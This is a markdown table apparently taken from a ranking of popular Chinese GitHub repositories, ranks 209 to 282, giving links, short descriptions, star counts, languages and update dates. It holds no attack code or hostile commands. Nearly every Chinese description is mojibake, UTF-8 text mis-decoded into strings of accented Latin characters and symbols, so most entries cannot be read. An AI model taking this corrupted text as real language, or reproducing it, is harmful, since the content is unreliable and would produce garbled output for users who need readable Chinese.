|209|[star7th/showdoc](https://github.com/star7th/showdoc)|ShowDoc is a tool greatly applicable for an IT team to share documents online‰∏Ä‰∏™ÈùûÂ∏∏ÈÄÇÂêàITÂõ¢ÈòüÁöÑÂú®Á∫øAPIÊñáÊ°£„ÄÅÊäÄÊúØÊñáÊ°£Â∑•ÂÖ∑|8.0k|JavaScript|10/24|
|210|[fangzesheng/free-api](https://github.com/fangzesheng/free-api)|Êî∂ÈõÜÂÖçË¥πÁöÑÊé•Âè£ÊúçÂä°,ÂÅö‰∏Ä‰∏™apiÁöÑÊê¨ËøêÂ∑•|8.0k|-|10/11|
|211|[Embedding/Chinese-Word-Vectors](https://github.com/Embedding/Chinese-Word-Vectors)|100+ Chinese Word Vectors ‰∏äÁôæÁßçÈ¢ÑËÆ≠ÁªÉ‰∏≠ÊñáËØçÂêëÈáè |8.0k|Python|08/24|
|212|[didi/chameleon](https://github.com/didi/chameleon)|ü¶é ‰∏ÄÂ•ó‰ª£Á†ÅËøêË°åÂ§öÁ´ØÔºå‰∏ÄÁ´ØÊâÄËßÅÂç≥Â§öÁ´ØÊâÄËßÅ|7.9k|JavaScript|09/21|
|213|[dxcweb/high-speed-downloader](https://github.com/dxcweb/high-speed-downloader)|Â∑≤‰∏çÂÜçÁª¥Êä§|7.9k|-|04/16|
|214|[flutterchina/flutter-in-action](https://github.com/flutterchina/flutter-in-action)|„ÄäFlutterÂÆûÊàò„ÄãÁîµÂ≠ê‰π¶|7.8k|HTML|09/28|
|215|[sfyc23/EverydayWechat](https://github.com/sfyc23/EverydayWechat)|ÂæÆ‰ø°Âä©ÊâãÔºö1.ÊØèÊó•ÂÆöÊó∂ÁªôÂ•ΩÂèãÔºàÂ•≥ÂèãÔºâÂèëÈÄÅÂÆöÂà∂Ê∂àÊÅØ„ÄÇ2.Êú∫Âô®‰∫∫Ëá™Âä®ÂõûÂ§çÂ•ΩÂèã„ÄÇ3.Áæ§Âä©ÊâãÂäüËÉΩÔºà‰æãÂ¶ÇÔºöÊü•ËØ¢ÂûÉÂúæÂàÜÁ±ª„ÄÅÂ§©Ê∞î„ÄÅÊó•ÂéÜ„ÄÅÁîµÂΩ±ÂÆûÊó∂Á•®Êàø„ÄÅÂø´ÈÄíÁâ©ÊµÅ„ÄÅPM2.5Á≠âÔºâ|7.7k|Python|09/28|
|216|[rootsongjc/kubernetes-handbook](https://github.com/rootsongjc/kubernetes-handbook)|Kubernetes‰∏≠ÊñáÊåáÂçó/‰∫ëÂéüÁîüÂ∫îÁî®Êû∂ÊûÑÂÆûË∑µÊâãÂÜå -  https://jimmysong.io/kubernetes-handbook|7.7k|Shell|10/10|
|217|[sylnsfar/qrcode](https://github.com/sylnsfar/qrcode)|artistic QR Code in Python ÔºàAnimated GIF qr codeÔºâ- Python Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô® ÔºàGIFÂä®ÊÄÅ‰∫åÁª¥Á†Å„ÄÅÂõæÁâá‰∫åÁª¥Á†ÅÔºâ|7.7k|Python|10/25|
|218|[Light-City/CPlusPlusThings](https://github.com/Light-City/CPlusPlusThings)|C++ÈÇ£‰∫õ‰∫ã|7.7k|C++|10/18|
|219|[haotian-wang/google-access-helper](https://github.com/haotian-wang/google-access-helper)|Ë∞∑Ê≠åËÆøÈóÆÂä©ÊâãÁ†¥Ëß£Áâà|7.6k|JavaScript|04/04|
|220|[hackstoic/golang-open-source-projects](https://github.com/hackstoic/golang-open-source-projects)|‰∏∫‰∫íËÅîÁΩëIT‰∫∫ÊâìÈÄ†ÁöÑ‰∏≠ÊñáÁâàawesome-go|7.6k|-|10/17|
|221|[TwoWater/Python](https://github.com/TwoWater/Python)|ÊúÄËâØÂøÉÁöÑ Python ÊïôÁ®ãÔºö|7.6k|-|10/19|
|222|[DeathKing/Learning-SICP](https://github.com/DeathKing/Learning-SICP)|MITËßÜÈ¢ëÂÖ¨ÂºÄËØæ„ÄäËÆ°ÁÆóÊú∫Á®ãÂ∫èÁöÑÊûÑÈÄ†ÂíåËß£Èáä„Äã‰∏≠ÊñáÂåñÈ°πÁõÆÂèäËØæÁ®ãÂ≠¶‰π†ËµÑÊñôÊêúÈõÜ„ÄÇ|7.6k|Ruby|02/25|
|223|[evil-huawei/evil-huawei](https://github.com/evil-huawei/evil-huawei)|Evil Huawei - Âçé‰∏∫‰ΩúËøáÁöÑÊÅ∂|7.6k|JavaScript|08/03|
|224|[hoochanlon/w3-goto-world](https://github.com/hoochanlon/w3-goto-world)|üçÖGit/AWS/Google ÈïúÂÉè ,SS/SSR/VMESSËäÇÁÇπ,WireGuard,IPFS, DeepWeb,Capitalism Áü•ËØÜÂÇ®Â§áÂ∫ì|7.6k|Python|10/26|
|225|[mzlogin/awesome-adb](https://github.com/mzlogin/awesome-adb)|ADB Usage Complete / ADB Áî®Ê≥ïÂ§ßÂÖ®|7.6k|-|08/17|
|226|[top-think/think](https://github.com/top-think/think)|ThinkPHP Framework ‚Äî‚ÄîÂçÅÂπ¥Âå†ÂøÉÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|7.6k|PHP|10/27|
|227|[thinkgem/jeesite](https://github.com/thinkgem/jeesite)|JeeSite ÊòØ‰∏Ä‰∏™‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåJava‰ºÅ‰∏öÂ∫îÁî®ÂºÄÊ∫êÊ°ÜÊû∂ÔºåJava EEÔºàJ2EEÔºâÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂Ôºå‰ΩøÁî®ÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBootstrap UIÔºâÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅÊùÉÈôêÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇ|7.5k|JavaScript|10/08|
|228|[icindy/wxParse](https://github.com/icindy/wxParse)|wxParse-ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂØåÊñáÊú¨Ëß£ÊûêËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÊîØÊåÅHTMLÂèämarkdownËß£Êûê|7.5k|JavaScript|03/19|
|229|[pwxcoo/chinese-xinhua](https://github.com/pwxcoo/chinese-xinhua)|:orange_book: ‰∏≠ÂçéÊñ∞ÂçéÂ≠óÂÖ∏Êï∞ÊçÆÂ∫ì„ÄÇÂåÖÊã¨Ê≠áÂêéËØ≠ÔºåÊàêËØ≠ÔºåËØçËØ≠ÔºåÊ±âÂ≠ó„ÄÇ|7.4k|Python|10/18|
|230|[nusr/hacker-laws-zh](https://github.com/nusr/hacker-laws-zh)|üíªüìñÂØπÂºÄÂèë‰∫∫ÂëòÊúâÁî®ÁöÑÂÆöÂæã„ÄÅÁêÜËÆ∫„ÄÅÂéüÂàôÂíåÊ®°Âºè„ÄÇ(Laws, Theories, Principles and Patterns that developers will find useful.)|7.4k|-|10/29|
|231|[opendigg/awesome-github-wechat-weapp](https://github.com/opendigg/awesome-github-wechat-weapp)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂºÄÊ∫êÈ°πÁõÆÂ∫ìÊ±áÊÄª|7.4k|-|08/16|
|232|[hs-web/hsweb-framework](https://github.com/hs-web/hsweb-framework)|hsweb (ha äs w…õb) ÊòØ‰∏Ä‰∏™Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂü∫Á°ÄÈ°πÁõÆ,ÈõÜÊàê‰∏ÄÊèΩÂ≠ê‰æøÊç∑ÂäüËÉΩÂ¶Ç:‰æøÊç∑ÁöÑÈÄöÁî®Â¢ûÂà†ÊîπÊü•,Âº∫Â§ßÁöÑÊùÉÈôêÁÆ°ÁêÜ,Âä®ÊÄÅÂ§öÊï∞ÊçÆÊ∫ê,Âä®ÊÄÅË°®Âçï,Âú®Á∫øÊï∞ÊçÆÂ∫ìÁª¥Êä§Á≠â. Âü∫‰∫é spring-boot,mybaits.|7.4k|Java|10/29|
|233|[banchichen/TZImagePickerController](https://github.com/banchichen/TZImagePickerController)|‰∏Ä‰∏™ÊîØÊåÅÂ§öÈÄâ„ÄÅÈÄâÂéüÂõæÂíåËßÜÈ¢ëÁöÑÂõæÁâáÈÄâÊã©Âô®ÔºåÂêåÊó∂ÊúâÈ¢ÑËßà„ÄÅË£ÅÂâ™ÂäüËÉΩÔºåÊîØÊåÅiOS6+„ÄÇ  A clone of UIImagePickerController, support picking multiple photos„ÄÅoriginal photo„ÄÅvideo, also allow preview photo and video, support iOS6+|7.4k|Objective-C|10/29|
|234|[vipstone/faceai](https://github.com/vipstone/faceai)|‰∏ÄÊ¨æÂÖ•Èó®Á∫ßÁöÑ‰∫∫ËÑ∏„ÄÅËßÜÈ¢ë„ÄÅÊñáÂ≠óÊ£ÄÊµã‰ª•ÂèäËØÜÂà´ÁöÑÈ°πÁõÆ.|7.3k|Python|04/16|
|235|[guyueyingmu/avbook](https://github.com/guyueyingmu/avbook)|AV ÁîµÂΩ±ÁÆ°ÁêÜÁ≥ªÁªüÔºå avmoo , javbus , javlibrary Áà¨Ëô´ÔºåÁ∫ø‰∏ä AV ÂΩ±ÁâáÂõæ‰π¶È¶ÜÔºåAV Á£ÅÂäõÈìæÊé•Êï∞ÊçÆÂ∫ìÔºåJapanese Adult Video Library,Adult Video Magnet Links - Japanese Adult Video Database|7.3k|PHP|10/01|
|236|[judasn/Linux-Tutorial](https://github.com/judasn/Linux-Tutorial)|„ÄäJava Á®ãÂ∫èÂëòÁúº‰∏≠ÁöÑ Linux„Äã|7.3k|Shell|10/27|
|237|[DuGuQiuBai/Java](https://github.com/DuGuQiuBai/Java)|27Â§©Êàê‰∏∫JavaÂ§ßÁ•û|7.3k|Java|10/18|
|238|[ruanyf/document-style-guide](https://github.com/ruanyf/document-style-guide)|‰∏≠ÊñáÊäÄÊúØÊñáÊ°£ÁöÑÂÜô‰ΩúËßÑËåÉ|7.3k|-|07/23|
|239|[wangshub/Douyin-Bot](https://github.com/wangshub/Douyin-Bot)|üòç Python ÊäñÈü≥Êú∫Âô®‰∫∫ÔºåËÆ∫Â¶Ç‰ΩïÂú®ÊäñÈü≥‰∏äÊâæÂà∞ÊºÇ‰∫ÆÂ∞èÂßêÂßêÔºü |7.2k|Python|05/07|
|240|[polaris1119/The-Golang-Standard-Library-by-Example](https://github.com/polaris1119/The-Golang-Standard-Library-by-Example)|GolangÊ†áÂáÜÂ∫ì„ÄÇÂØπ‰∫éÁ®ãÂ∫èÂëòËÄåË®ÄÔºåÊ†áÂáÜÂ∫ì‰∏éËØ≠Ë®ÄÊú¨Ë∫´ÂêåÊ†∑ÈáçË¶ÅÔºåÂÆÉÂ•ΩÊØî‰∏Ä‰∏™ÁôæÂÆùÁÆ±ÔºåËÉΩ‰∏∫ÂêÑÁßçÂ∏∏ËßÅÁöÑ‰ªªÂä°Êèê‰æõÂÆåÁæéÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ‰ª•Á§∫‰æãÈ©±Âä®ÁöÑÊñπÂºèËÆ≤Ëß£GolangÁöÑÊ†áÂáÜÂ∫ì„ÄÇ|7.2k|Go|07/22|
|241|[macrozheng/mall-admin-web](https://github.com/macrozheng/mall-admin-web)|mall-admin-webÊòØ‰∏Ä‰∏™ÁîµÂïÜÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÈ°πÁõÆÔºåÂü∫‰∫éVue+ElementÂÆûÁé∞„ÄÇ ‰∏ªË¶ÅÂåÖÊã¨ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÂäüËÉΩ„ÄÇ|7.2k|Vue|10/08|
|242|[PanDownloadServer/Server](https://github.com/PanDownloadServer/Server)|PanDownloadÁöÑ‰∏™‰∫∫Áª¥Êä§ÁâàÊú¨|7.1k|HTML|09/25|
|243|[eip-work/kuboard-press](https://github.com/eip-work/kuboard-press)|Kuboard ÊòØÂü∫‰∫é Kubernetes ÁöÑÂæÆÊúçÂä°ÁÆ°ÁêÜÁïåÈù¢„ÄÇÂêåÊó∂Êèê‰æõ Kubernetes ÂÖçË¥π‰∏≠ÊñáÊïôÁ®ãÔºåÂÖ•Èó®ÊïôÁ®ãÔºåÊúÄÊñ∞ÁâàÊú¨ÁöÑ Kubernetes v1.18 ÂÆâË£ÖÊâãÂÜåÔºå(k8s install) Âú®Á∫øÁ≠îÁñëÔºåÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|7.1k|JavaScript|10/29|
|244|[macrozheng/mall-learning](https://github.com/macrozheng/mall-learning)|mallÂ≠¶‰π†ÊïôÁ®ãÔºåÊû∂ÊûÑ„ÄÅ‰∏öÂä°„ÄÅÊäÄÊúØË¶ÅÁÇπÂÖ®Êñπ‰ΩçËß£Êûê„ÄÇmallÈ°πÁõÆÔºà39k+starÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºå‰ΩøÁî®Áé∞Èò∂ÊÆµ‰∏ªÊµÅÊäÄÊúØÂÆûÁé∞„ÄÇÊ∂µÁõñ‰∫ÜSpringBoot 2.3.0„ÄÅMyBatis 3.4.6„ÄÅElasticsearch 7.6.2„ÄÅRabbitMQ 3.7.15„ÄÅRedis 5.0„ÄÅMongoDB 4.2.5„ÄÅMysql5.7Á≠âÊäÄÊúØÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ|7.1k|Java|10/28|
|245|[huanghaibin-dev/CalendarView](https://github.com/huanghaibin-dev/CalendarView)|Android‰∏ä‰∏Ä‰∏™‰ºòÈõÖ„ÄÅ‰∏áËÉΩËá™ÂÆö‰πâUI„ÄÅÊîØÊåÅÂë®ËßÜÂõæ„ÄÅËá™ÂÆö‰πâÂë®Ëµ∑Âßã„ÄÅÊÄßËÉΩÈ´òÊïàÁöÑÊó•ÂéÜÊéß‰ª∂ÔºåÊîØÊåÅÁÉ≠ÊèíÊãîÂÆûÁé∞ÁöÑUIÂÆöÂà∂ÔºÅÊîØÊåÅÊ†áËÆ∞„ÄÅËá™ÂÆö‰πâÈ¢úËâ≤„ÄÅÂÜúÂéÜ„ÄÅËá™ÂÆö‰πâÊúàËßÜÂõæÂêÑÁßçÊòæÁ§∫Ê®°ÂºèÁ≠â„ÄÇCanvasÁªòÂà∂ÔºåÈÄüÂ∫¶Âø´„ÄÅÂç†Áî®ÂÜÖÂ≠ò‰ΩéÔºå‰Ω†ÁúüÁöÑÊÉ≥‰∏çÂà∞Êó•ÂéÜÂ±ÖÁÑ∂ËøòÂèØ‰ª•Â¶ÇÊ≠§‰ºòÈõÖÔºÅAn elegant, highly customized and high-performance Calendar Widget on Android.|7.1k|Java|09/16|
|246|[xcatliu/typescript-tutorial](https://github.com/xcatliu/typescript-tutorial)|TypeScript ÂÖ•Èó®ÊïôÁ®ã|7.1k|TypeScript|10/21|
|247|[wsdjeg/vim-galore-zh_cn](https://github.com/wsdjeg/vim-galore-zh_cn)|Vim ‰ªéÂÖ•Èó®Âà∞Á≤æÈÄö|7.0k|Vim script|09/19|
|248|[crawlab-team/crawlab](https://github.com/crawlab-team/crawlab)|Distributed web crawler admin platform for spiders management regardless of languages and frameworks. ÂàÜÂ∏ÉÂºèÁà¨Ëô´ÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅ‰ªª‰ΩïËØ≠Ë®ÄÂíåÊ°ÜÊû∂|7.0k|Go|10/29|
|249|[helloqingfeng/Awsome-Front-End-learning-resource](https://github.com/helloqingfeng/Awsome-Front-End-learning-resource)|:octocat:GitHubÊúÄÂÖ®ÁöÑÂâçÁ´ØËµÑÊ∫êÊ±áÊÄª‰ªìÂ∫ìÔºàÂåÖÊã¨ÂâçÁ´ØÂ≠¶‰π†„ÄÅÂºÄÂèëËµÑÊ∫ê„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠âÔºâ|7.0k|PHP|08/28|
|250|[bingoogolapple/BGAQRCode-Android](https://github.com/bingoogolapple/BGAQRCode-Android)|QRCode Êâ´Êèè‰∫åÁª¥Á†Å„ÄÅÊâ´ÊèèÊù°ÂΩ¢Á†Å„ÄÅÁõ∏ÂÜåËé∑ÂèñÂõæÁâáÂêéËØÜÂà´„ÄÅÁîüÊàêÂ∏¶ Logo ‰∫åÁª¥Á†Å„ÄÅÊîØÊåÅÂæÆÂçöÂæÆ‰ø° QQ ‰∫åÁª¥Á†ÅÊâ´ÊèèÊ†∑Âºè|6.9k|C|07/11|
|251|[crossoverJie/cim](https://github.com/crossoverJie/cim)|üì≤cim(cross IM) ÈÄÇÁî®‰∫éÂºÄÂèëËÄÖÁöÑÂàÜÂ∏ÉÂºèÂç≥Êó∂ÈÄöËÆØÁ≥ªÁªü|6.9k|Java|10/13|
|252|[bailicangdu/react-pxq](https://github.com/bailicangdu/react-pxq)|‰∏Ä‰∏™ react + redux ÁöÑÂÆåÊï¥È°πÁõÆ Âíå ‰∏™‰∫∫ÊÄªÁªì|6.9k|JavaScript|08/11|
|253|[inferjay/AndroidDevTools](https://github.com/inferjay/AndroidDevTools)|Êî∂ÈõÜÊï¥ÁêÜAndroidÂºÄÂèëÊâÄÈúÄÁöÑAndroid SDK„ÄÅÂºÄÂèë‰∏≠Áî®Âà∞ÁöÑÂ∑•ÂÖ∑„ÄÅAndroidÂºÄÂèëÊïôÁ®ã„ÄÅAndroidËÆæËÆ°ËßÑËåÉÔºåÂÖçË¥πÁöÑËÆæËÆ°Á¥†ÊùêÁ≠â„ÄÇ|6.9k|-|10/30|
|254|[zh-google-styleguide/zh-google-styleguide](https://github.com/zh-google-styleguide/zh-google-styleguide)|Google ÂºÄÊ∫êÈ°πÁõÆÈ£éÊ†ºÊåáÂçó (‰∏≠ÊñáÁâà)|6.9k|Makefile|10/29|
|255|[xirong/my-git](https://github.com/xirong/my-git)|Individual collecting material of learning gitÔºàÊúâÂÖ≥ git ÁöÑÂ≠¶‰π†ËµÑÊñôÔºâ|6.8k|-|07/12|
|256|[halfrost/Halfrost-Field](https://github.com/halfrost/Halfrost-Field)|‚úçüèª ËøôÈáåÊòØÂÜôÂçöÂÆ¢ÁöÑÂú∞Êñπ ‚Äî‚Äî Halfrost-Field ÂÜ∞Èúú‰πãÂú∞|6.8k|Objective-C|09/20|
|257|[huangz1990/redis-3.0-annotated](https://github.com/huangz1990/redis-3.0-annotated)|Â∏¶ÊúâËØ¶ÁªÜÊ≥®ÈáäÁöÑ Redis 3.0 ‰ª£Á†ÅÔºàannotated Redis 3.0 source codeÔºâ„ÄÇ|6.8k|C|04/23|
|258|[NLP-LOVE/ML-NLP](https://github.com/NLP-LOVE/ML-NLP)|Ê≠§È°πÁõÆÊòØÊú∫Âô®Â≠¶‰π†(Machine Learning)„ÄÅÊ∑±Â∫¶Â≠¶‰π†(Deep Learning)„ÄÅNLPÈù¢ËØï‰∏≠Â∏∏ËÄÉÂà∞ÁöÑÁü•ËØÜÁÇπÂíå‰ª£Á†ÅÂÆûÁé∞Ôºå‰πüÊòØ‰Ωú‰∏∫‰∏Ä‰∏™ÁÆóÊ≥ïÂ∑•Á®ãÂ∏àÂøÖ‰ºöÁöÑÁêÜËÆ∫Âü∫Á°ÄÁü•ËØÜ„ÄÇ|6.8k|Jupyter Notebook|04/20|
|259|[fuck-xuexiqiangguo/Fuck-XueXiQiangGuo](https://github.com/fuck-xuexiqiangguo/Fuck-XueXiQiangGuo)|Â≠¶‰π†Âº∫ÂõΩ Êáí‰∫∫Âà∑ÂàÜÂ∑•ÂÖ∑ Ëá™Âä®Â≠¶‰π†|6.8k|-|05/17|
|260|[greatghoul/remote-working](https://github.com/greatghoul/remote-working)|Êî∂ÈõÜÊï¥ÁêÜËøúÁ®ãÂ∑•‰ΩúÁõ∏ÂÖ≥ÁöÑËµÑÊñô|6.7k|Ruby|10/25|
|261|[XXApple/AndroidLibs](https://github.com/XXApple/AndroidLibs)|:fire:Ê≠£Âú®Êàê‰∏∫Âè≤‰∏äÊúÄÂÖ®ÂàÜÁ±ª Android ÂºÄÊ∫êÂ§ßÂÖ®~~~~ÔºàÈïøÊúüÊõ¥Êñ∞ Star ‰∏Ä‰∏ãÂêßÔºâ|6.7k|-|04/20|
|262|[jobbole/awesome-javascript-cn](https://github.com/jobbole/awesome-javascript-cn)|JavaScript ËµÑÊ∫êÂ§ßÂÖ®‰∏≠ÊñáÁâàÔºåÂÜÖÂÆπÂåÖÊã¨ÔºöÂåÖÁÆ°ÁêÜÂô®„ÄÅÂä†ËΩΩÂô®„ÄÅÊµãËØïÊ°ÜÊû∂„ÄÅËøêË°åÂô®„ÄÅQA„ÄÅMVCÊ°ÜÊû∂ÂíåÂ∫ì„ÄÅÊ®°ÊùøÂºïÊìéÁ≠â|6.6k|-|06/28|
|263|[apachecn/Interview](https://github.com/apachecn/Interview)|Interview = ÁÆÄÂéÜÊåáÂçó + LeetCode + Kaggle|6.6k|Jupyter Notebook|09/10|
|264|[hq450/fancyss_history_package](https://github.com/hq450/fancyss_history_package)|ÁßëÂ≠¶‰∏äÁΩëÊèí‰ª∂ÁöÑÁ¶ªÁ∫øÂÆâË£ÖÂåÖÂÇ®Â≠òÂú®ËøôÈáå|6.6k|-|10/12|
|265|[open-power-workgroup/Hospital](https://github.com/open-power-workgroup/Hospital)|OpenPowerÂ∑•‰ΩúÁªÑÊî∂ÈõÜÊ±áÊÄªÁöÑÂåªÈô¢ÂºÄÊîæÊï∞ÊçÆ|6.5k|HTML|10/27|
|266|[Qv2ray/Qv2ray](https://github.com/Qv2ray/Qv2ray)|:star: Linux / Windows / macOS Ë∑®Âπ≥Âè∞ V2Ray ÂÆ¢Êà∑Á´Ø   ÊîØÊåÅ VMess / VLESS / SSR / Trojan / Trojan-Go / NaiveProxy / HTTP / SOCKS5   ‰ΩøÁî® C++ / Qt5 ÂºÄÂèë   ÂèØÊãìÂ±ïÊèí‰ª∂ÂºèËÆæËÆ° :star:|6.5k|C++|10/29|
|267|[getgridea/gridea](https://github.com/getgridea/gridea)|‚úçÔ∏èA static blog writing client (‰∏Ä‰∏™ÈùôÊÄÅÂçöÂÆ¢ÂÜô‰ΩúÂÆ¢Êà∑Á´Ø)|6.5k|CSS|09/08|
|268|[luyishisi/Anti-Anti-Spider](https://github.com/luyishisi/Anti-Anti-Spider)|Ë∂äÊù•Ë∂äÂ§öÁöÑÁΩëÁ´ôÂÖ∑ÊúâÂèçÁà¨Ëô´ÁâπÊÄßÔºåÊúâÁöÑÁî®ÂõæÁâáÈöêËóèÂÖ≥ÈîÆÊï∞ÊçÆÔºåÊúâÁöÑ‰ΩøÁî®Âèç‰∫∫Á±ªÁöÑÈ™åËØÅÁ†ÅÔºåÂª∫Á´ãÂèçÂèçÁà¨Ëô´ÁöÑ‰ª£Á†Å‰ªìÂ∫ìÔºåÈÄöËøá‰∏é‰∏çÂêåÁâπÊÄßÁöÑÁΩëÁ´ôÂÅöÊñó‰∫âÔºàÊó†ÊÅ∂ÊÑèÔºâÊèêÈ´òÊäÄÊúØ„ÄÇÔºàÊ¨¢ËøéÊèê‰∫§Èöæ‰ª•ÈááÈõÜÁöÑÁΩëÁ´ôÔºâÔºàÂõ†Â∑•‰ΩúÂéüÂõ†ÔºåÈ°πÁõÆÊöÇÂÅúÔºâ |6.5k|Python|06/29|
|269|[JeffreySu/WeiXinMPSDK](https://github.com/JeffreySu/WeiXinMPSDK)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞SDK Senparc.Weixin for C#ÔºåÊîØÊåÅ.NET FrameworkÂèä.NET Core„ÄÇÂ∑≤ÊîØÊåÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÂ∞èÁ®ãÂ∫è„ÄÅÂ∞èÊ∏∏Êàè„ÄÅ‰ºÅ‰∏öÂè∑„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÂºÄÊîæÂπ≥Âè∞„ÄÅÂæÆ‰ø°ÊîØ‰ªò„ÄÅJSSDK„ÄÅÂæÆ‰ø°Âë®ËæπÁ≠âÂÖ®Âπ≥Âè∞„ÄÇ WeChat SDK for C#.|6.5k|C#|10/24|
|270|[cloudreve/Cloudreve](https://github.com/cloudreve/Cloudreve)|üå©ÊîØÊåÅÂ§öÂÆ∂‰∫ëÂ≠òÂÇ®ÁöÑ‰∫ëÁõòÁ≥ªÁªü (A project helps you build your own cloud in minutes)|6.5k|Go|10/26|
|271|[qinjx/30min_guides](https://github.com/qinjx/30min_guides)|Ë¶ÉÂÅ•Á••ÁöÑÂ≠¶‰π†Á¨îËÆ∞ÔºåÂêÑÁßçÂá†ÂçÅÂàÜÈíüÂÖ•Èó®ÁöÑÊñáÊ°£|6.4k|-|02/09|
|272|[thx/rap2-delos](https://github.com/thx/rap2-delos)|ÈòøÈáåÂ¶àÂ¶àÂâçÁ´ØÂõ¢ÈòüÂá∫ÂìÅÁöÑÂºÄÊ∫êÊé•Âè£ÁÆ°ÁêÜÂ∑•ÂÖ∑RAPÁ¨¨‰∫å‰ª£|6.4k|TypeScript|10/27|
|273|[skywind3000/awesome-cheatsheets](https://github.com/skywind3000/awesome-cheatsheets)|Ë∂ÖÁ∫ßÈÄüÊü•Ë°® - ÁºñÁ®ãËØ≠Ë®Ä„ÄÅÊ°ÜÊû∂ÂíåÂºÄÂèëÂ∑•ÂÖ∑ÁöÑÈÄüÊü•Ë°®ÔºåÂçï‰∏™Êñá‰ª∂ÂåÖÂê´‰∏ÄÂàá‰Ω†ÈúÄË¶ÅÁü•ÈÅìÁöÑ‰∏úË•ø :zap:|6.4k|Shell|10/21|
|274|[Dod-o/Statistical-Learning-Method_Code](https://github.com/Dod-o/Statistical-Learning-Method_Code)|ÊâãÂÜôÂÆûÁé∞ÊùéËà™„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„Äã‰π¶‰∏≠ÂÖ®ÈÉ®ÁÆóÊ≥ï|6.4k|Python|09/08|
|275|[czy36mengfei/tensorflow2_tutorials_chinese](https://github.com/czy36mengfei/tensorflow2_tutorials_chinese)|tensorflow2‰∏≠ÊñáÊïôÁ®ãÔºåÊåÅÁª≠Êõ¥Êñ∞(ÂΩìÂâçÁâàÊú¨:tensorflow2.0)Ôºåtag: tensorflow 2.0 tutorials|6.4k|Jupyter Notebook|06/11|
|276|[deeplearning-ai/machine-learning-yearning-cn](https://github.com/deeplearning-ai/machine-learning-yearning-cn)|Machine Learning Yearning ‰∏≠ÊñáÁâà - „ÄäÊú∫Âô®Â≠¶‰π†ËÆ≠ÁªÉÁßòÁ±ç„Äã - Andrew Ng Ëëó|6.4k|CSS|04/05|
|277|[renzifeng/ZFPlayer](https://github.com/renzifeng/ZFPlayer)|Support customization of any player SDK and control layer(ÊîØÊåÅÂÆöÂà∂‰ªª‰ΩïÊí≠ÊîæÂô®SDKÂíåÊéßÂà∂Â±Ç)|6.4k|Objective-C|09/18|
|278|[ChenYilong/CYLTabBarController](https://github.com/ChenYilong/CYLTabBarController)|[EN]It is an iOS UI module library for adding animation to iOS tabbar items and icons with Lottie, and adding a bigger center UITabBar Item.  [CN]„Äê‰∏≠ÂõΩÁâπËâ≤ TabBar„Äë‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ Lottie Âä®ÁîªTabBarÔºåÊîØÊåÅ‰∏≠Èó¥Â∏¶+Âè∑ÁöÑTabBarÊ†∑ÂºèÔºåËá™Â∏¶Á∫¢ÁÇπËßíÊ†áÔºåÊîØÊåÅÂä®ÊÄÅÂà∑Êñ∞„ÄÇ„ÄêiOS13 & Dark Mode  & iPhone XS MAX supported„Äë|6.3k|Objective-C|05/19|
|279|[yifeikong/reverse-interview-zh](https://github.com/yifeikong/reverse-interview-zh)|ÊäÄÊúØÈù¢ËØïÊúÄÂêéÂèçÈóÆÈù¢ËØïÂÆòÁöÑËØù|6.3k|-|10/01|
|280|[wuhan2020/wuhan2020](https://github.com/wuhan2020/wuhan2020)|Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÈò≤Áñ´‰ø°ÊÅØÊî∂ÈõÜÂπ≥Âè∞|6.3k|-|10/01|
|281|[alibaba/otter](https://github.com/alibaba/otter)|ÈòøÈáåÂ∑¥Â∑¥ÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÂêåÊ≠•Á≥ªÁªü(Ëß£ÂÜ≥‰∏≠ÁæéÂºÇÂú∞Êú∫Êàø)|6.2k|Java|10/13|
|282|[dyc87112/SpringCloud-Learning](https://github.com/dyc87112/SpringCloud-Learning)|Spring CloudÂü∫Á°ÄÊïôÁ®ãÔºåÊåÅÁª≠ËøûËΩΩÊõ¥Êñ∞‰∏≠|6.2k|Java|09/10|
